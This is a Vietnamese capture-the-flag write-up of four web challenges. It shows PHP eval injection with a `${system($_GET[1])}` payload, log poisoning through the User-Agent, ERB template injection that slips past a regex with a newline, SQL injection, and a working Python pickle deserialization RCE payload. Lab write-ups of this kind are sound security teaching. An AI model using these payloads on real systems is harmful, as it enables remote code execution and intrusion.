# Web challenger writeup
`capy3ra`

- [LoveTok](#lovetok)
- [Toxic](#toxic)
- [Neonify ](#neonify)
- [C O P](#c_o_p)

## LoveTok

1. Đây là một bài whitebox nên ta được cung cấp source code.
2. Sau khi đọc source, ta có thể biết được luồng xử lý của app. Ở đây hệ thống sẽ xử lý theo mô hình MVC. Với model TimeModel thực hiện khảo tạo một đối tượng ước tính thời gian với
3. Đối tượng TimeModel được khởi tạo với param `format` được truyền vào
```
public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
```
4. Với hàm khởi tạo model được thực hiện sẽ tạo ra một thuộc tính `prediction` được random một khoảng thời gian
5. Sau đó ở view index biến time sẽ được gán cho kết quả của phương thức getTime() với đoạn code như sau:
```
public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
```
6. Hàm eval sẽ thực hiện một câu lệnh php động với 2 tham số `format` được nhập vào và `prediction` được random ra từ phương thức khởi tạo ở trên để gán giá trị cho biến time.
7. Với tham số format mà ta kiếm soát ta sẽ cố gắng inject vào nó. Hàm `addslashes` được sử dụng để escapse các dấu `'`,`"` nhưng thế vào chưa đủ.
8. Ý tưởng ở đây là ta sẽ chèn đoạn sau `${system($_GET[1])}` vào hàm eval rồi thêm tham số `1` để exec shell.

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/72279455-41e0-4030-92c0-5933e4098502)

9. RCE thành công. Đọc flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/55d05f7e-1bd9-4f7f-a2fa-580158e1e3d7)

## Toxic

1. Whitebox. Qua phân tích có thể thấy app sẽ tạo ra một object `PageModel` với thuộc tính `file`, rồi nội dung trong sẽ là file được include
2. Có thể đọc file bằng cách thay đổi giá trị thuộc tính rồi serialize lại.
3. Ở bài này, ta có thể đọc được file access.log

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/87798192-18b6-4525-a44b-61d31ab42a5f)

4. Chèn mã php thông qua user-agent thì nhận thấy rce thành công.

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/911ef94f-3b4a-49a0-9088-771f825e4044)

## Neonify

1. Ở bài này nhận thấy trang web lấy tham số neon người dùng nhập vào để hiển thị kết quả lên màn hình sử dụng template ERB của ruby.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/0442c52a-7c62-409c-834c-14189e60edcf)
2. Ở đây, họ sử dụng regex để validate rằng input vào chỉ chứa một chuỗi gồm các chữ và số hoặc dấu cách mà k xuất hiện các ký tự đặc biệt.
3. Tìm cách để bypass nó thì có một bài viết hướng dẫn bypass regex bằng cách xuống dòng [link](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/)
4. Inject template để list file trong thư mục gốc
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a5b86823-8e3e-43e0-9065-e8cd31d79862)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a4a97732-19da-4b2c-85b4-b6e6e0af1e8d)

5. Lấy flag
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/8d6fc4bb-33e0-457e-8d3b-4d36a43f07eb)


## C O P

1. Fuzzing web đồng thời xem source code. Trước hết để ý 2 file `routes.py` và `models.py` nhận thấy web có 2 route chính. 1 là trang chủ lấy thông tin toàn bộ sản phẩm trong bảng products trong db. 2 là endpoint view lấy giá trị product_id để lấy thông tin chi tiết sản phẩm

```
#routes.py
@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))

#models.py
def select_by_id(product_id):
	return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

2. Tuy nhiên nhận thấy ở đây, họ truy vấn sql bằng cách nối chuỗi, hơn nữa biến product_id có thể dễ dàng kiểm soát. (sqli)

3. Hơn nữa ở đây họ dùng pickle để serialize và deserialize thông tin sản phẩm. Lợi dụng pickle để exploit rce [RCE with pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

4. Dùng dump + b64encode object Items rồi lấy giá trị sau đó insert cột data trong bảng product. Khi mấy lấy dữ liệu thì load + b64 decode từ db.

5. Dựa vào wu trên, code serialize để server pickle load.

```
import pickle
import base64
import subprocess

payload = ['cat', 'flag.txt', 'application/static/.']

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (payload, ))

if __name__ == '__main__':
    print(base64.b64encode(pickle.dumps(RCE())))

```

6. Sau đó vào url /static/flag.txt lấy flag. (Không hiểu sao cách dùng os.system không được nên phải thay bằng subprocess)
